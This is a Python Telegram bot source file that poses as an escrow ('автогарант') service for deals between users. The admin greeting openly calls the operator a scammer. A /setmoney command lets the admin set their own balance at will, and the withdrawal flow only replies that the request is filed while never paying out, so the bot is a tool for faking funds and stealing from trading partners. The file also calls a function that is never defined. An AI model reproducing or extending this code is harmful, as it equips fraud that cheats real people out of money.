import logging
import sqlite3
from aiogram import Bot, Dispatcher, types
from aiogram.contrib.fsm_storage.memory import MemoryStorage
from aiogram import executor
from aiogram.types import ReplyKeyboardMarkup, KeyboardButton
from aiogram.dispatcher.filters.state import State, StatesGroup
from aiogram.dispatcher import FSMContext
from aiogram.types import ReplyKeyboardRemove

class MyForm(StatesGroup):
    userid = State()
    withdraw_method = State()
    withdraw_address = State()

logging.basicConfig(level=logging.INFO)

bot = Bot(token="ТУТ ТОКЕН")
admin_id = "ТУТ ВАШ АЙДИ"

storage = MemoryStorage()
dp = Dispatcher(bot, storage=storage)

conn = sqlite3.connect("database.db")
cursor = conn.cursor()

cursor.execute(
    """CREATE TABLE IF NOT EXISTS users (id INTEGER PRIMARY KEY AUTOINCREMENT, user_id INTEGER NOT NULL UNIQUE, balance REAL DEFAULT 0, rating REAL DEFAULT 0, num_transactions INTEGER DEFAULT 0, total_amount REAL DEFAULT 0)"""
)
conn.commit()

keyboard_admin = ReplyKeyboardMarkup(
    keyboard=[
        [KeyboardButton(text="Профиль")],
        [KeyboardButton(text="Передать средства")],
        [KeyboardButton(text="Вывод средств")]
    ],
    resize_keyboard=True,
)

keyboard_user = ReplyKeyboardMarkup(
    keyboard=[
        [KeyboardButton(text="Профиль")],
        [KeyboardButton(text="Передать средства")],
        [KeyboardButton(text="Вывод средств")]
    ],
    resize_keyboard=True,
)

withdraw_methods = ["QIWI", "WEBMONEY", "BTC", "TRX", "ETH", "RUSCARD", "NORUSCARD"]


def get_user_profile(user_id):
    cursor.execute("SELECT * FROM users WHERE user_id=?", (user_id,))
    user_profile = cursor.fetchone()
    return user_profile


def set_user_balance(user_id, amount):
    cursor.execute("UPDATE users SET balance=? WHERE user_id=?", (amount, user_id))
    conn.commit()


def increase_user_transactions(user_id):
    cursor.execute("UPDATE users SET num_transactions=num_transactions+1 WHERE user_id=?", (user_id,))
    conn.commit()


def increase_total_amount(user_id, amount):
    cursor.execute("UPDATE users SET total_amount=total_amount+? WHERE user_id=?", (amount, user_id))
    conn.commit()


def set_user_rating(user_id, rating):
    cursor.execute("UPDATE users SET rating=? WHERE user_id=?", (rating, user_id))
    conn.commit()


async def notify_new_user(user_id):
    await bot.send_message(admin_id, f"Новый пользователь бота - {user_id}")


async def notify_funds_received(recipient_user_id, amount):
    await bot.send_message(recipient_user_id, f"Вы получили {amount} на свой кошелек")


@dp.message_handler(commands=["start"])
async def start_command(message: types.Message):
    user_id = message.from_user.id
    cursor.execute("SELECT * FROM users WHERE user_id=?", (user_id,))
    user = cursor.fetchone()

    if user is None:
        cursor.execute("INSERT INTO users (user_id) VALUES (?)", (user_id,))
        conn.commit()

        await notify_new_user(user_id)

    if str(user_id) == admin_id:
        await bot.send_message(message.chat.id, "Привет, Скаммер. Кого наебываем? ", reply_markup=keyboard_admin)
    else:
        await bot.send_message(message.chat.id, "Привет! Я рад приветствовать тебя! Я бот-автогарант, готовый помочь тебе в твоих сделках. Я могу следить за безопасностью твоих транзакций и помогать в переводе средств между пользователями. Если у тебя есть вопросы или нужна помощь, просто спроси!", reply_markup=keyboard_user)


@dp.message_handler(lambda message: message.text == "Профиль", state="*")
async def handle_profile_button(message: types.Message, state: FSMContext):
    user_profile = get_user_profile(message.from_user.id)

    if user_profile is not None:
        _, user_id, balance, rating, num_transactions, total_amount = user_profile
        text = f"ID: {user_id}\nБаланс: {balance}\nРейтинг: {rating}\nКоличество сделок: {num_transactions}\nКоличество рублей в сделке: {total_amount}"
    else:
        text = "Профиль пользователя не найден"

    await bot.send_message(message.chat.id, text)

    await state.finish()


@dp.message_handler(lambda message: message.text == "Передать средства", state="*")
async def handle_send_money_button(message: types.Message, state: FSMContext):
    await MyForm.userid.set()
    await message.reply("Введите сумму и ID пользователя (через пробел):")


@dp.message_handler(state=MyForm.userid)
async def handle_send_money_userid(message: types.Message, state: FSMContext):
    data = message.text.split()
    if len(data) == 2:
        amount = float(data[0])
        recipient_user_id = data[1]

        sender_profile = get_user_profile(message.from_user.id)
        recipient_profile = get_user_profile(recipient_user_id)

        if sender_profile is not None and recipient_profile is not None:
            sender_balance = sender_profile[2]

            if sender_balance >= amount:
                recipient_balance = recipient_profile[2]

                sender_balance -= amount
                recipient_balance += amount

                set_user_balance(message.from_user.id, sender_balance)
                set_user_balance(recipient_user_id, recipient_balance)
                increase_user_transactions(message.from_user.id)
                increase_total_amount(message.from_user.id, amount)

                await bot.send_message(
                    message.chat.id,
                    f"Вы успешно отправили {amount} пользователю {recipient_user_id}",
                )

                await notify_funds_received(recipient_user_id, amount)
            else:
                await bot.send_message(
                    message.chat.id, "Ошибка: недостаточно средств на балансе"
                )
        else:
            await bot.send_message(
                message.chat.id, "Ошибка: отправитель или получатель не найден"
            )
    else:
        await bot.send_message(
            message.chat.id,
            "Ошибка ввода команды отправки денег. Пожалуйста, введите команду в формате 'сумма ID_пользователя'",
        )

    await finish_interaction(message)
    await state.finish()

@dp.message_handler(commands=["setmoney"])
async def handle_set_money_command(message: types.Message):
    if str(message.from_user.id) == admin_id:
        try:
            command, new_balance = message.text.split()
            new_balance = float(new_balance)
            set_user_balance(message.from_user.id, new_balance)
            await bot.send_message(
                message.chat.id,
                f"Баланс пользователя успешно установлен: {new_balance}",
            )
        except ValueError:
            await bot.send_message(
                message.chat.id,
                "Ошибка ввода команды установки баланса. Пожалуйста, введите команду в формате '/setmoney деньги'",
            )
    else:
        await bot.send_message(message.chat.id, "У вас нет прав для установки баланса.")


@dp.message_handler(commands=["setrating"])
async def handle_set_rating_command(message: types.Message):
    if str(message.from_user.id) == admin_id:
        try:
            command, user_id, new_rating = message.text.split()
            user_id = int(user_id)
            new_rating = float(new_rating)
            set_user_rating(user_id, new_rating)
            await bot.send_message(
                message.chat.id,
                f"Рейтинг пользователя {user_id} успешно установлен: {new_rating}",
            )
        except ValueError:
            await bot.send_message(
                message.chat.id,
                "Ошибка ввода команды установки рейтинга. Пожалуйста, введите команду в формате '/setrating ID_пользователя рейтинг'",
            )
    else:
        await bot.send_message(message.chat.id, "У вас нет прав для установки рейтинга.")

@dp.message_handler(lambda message: message.text == "Вывод средств", state="*")
async def handle_withdraw_button(message: types.Message, state: FSMContext):
    user_profile = get_user_profile(message.from_user.id)
    if user_profile is not None and user_profile[2] >= 1:
        keyboard = ReplyKeyboardMarkup(
            keyboard=[
                [KeyboardButton(text=method)] for method in withdraw_methods
            ],
            resize_keyboard=True,
        )
        await bot.send_message(
            message.chat.id,
            "Выберите способ вывода средств:",
            reply_markup=keyboard,
        )
        await MyForm.withdraw_method.set()
    else:
        await bot.send_message(
            message.chat.id,
            "У вас недостаточно средств на балансе для вывода.",
            reply_markup=keyboard_user,
        )


@dp.message_handler(lambda message: message.text in withdraw_methods, state=MyForm.withdraw_method)
async def handle_withdraw_payment(message: types.Message, state: FSMContext):
    payment_method = message.text
    await state.update_data(payment_method=payment_method)
    await MyForm.withdraw_address.set()
    await message.reply("Введите сумму и адрес кошелька (через пробел):")


@dp.message_handler(state=MyForm.withdraw_address)
async def handle_withdraw_address(message: types.Message, state: FSMContext):
    data = await state.get_data()
    payment_method = data.get('payment_method')
    amount, withdrawal_address = message.text.split()
    amount = float(amount)

    user_profile = get_user_profile(message.from_user.id)
    if user_profile is not None:
        _, user_id, balance, rating, num_transactions, total_amount = user_profile
        if balance >= amount:
            await bot.send_message(
                message.chat.id,
                "Заявка на вывод оформлена. Ожидайте",
                reply_markup=keyboard_user,
            )
            await finish_interaction(message)
            await state.finish()
        else:
            await bot.send_message(
                message.chat.id,
                "Ошибка: недостаточно средств на балансе",
                reply_markup=keyboard_user,
            )
    else:
        await bot.send_message(
            message.chat.id,
            "Ошибка: профиль пользователя не найден",
            reply_markup=keyboard_user,
        )

if __name__ == "__main__":
    executor.start_polling(dp, skip_updates=True)